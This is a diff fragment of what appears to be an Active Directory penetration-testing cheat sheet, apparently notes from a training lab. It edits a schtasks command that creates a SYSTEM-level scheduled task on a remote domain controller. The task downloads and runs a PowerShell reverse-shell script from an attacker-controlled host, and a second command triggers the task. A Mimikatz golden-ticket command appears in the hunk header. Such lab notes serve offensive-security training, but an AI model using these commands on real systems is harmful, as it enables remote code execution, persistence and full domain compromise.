@@ -780,8 +780,7 @@ BetterSafetyKatz "kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-13
 ```
 ```
 # Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
-schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8000/InvokePowershellTcp.ps1''')'"
-```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (iwr http://172.16.100.95/Tools/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'"```
 ```
 # Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
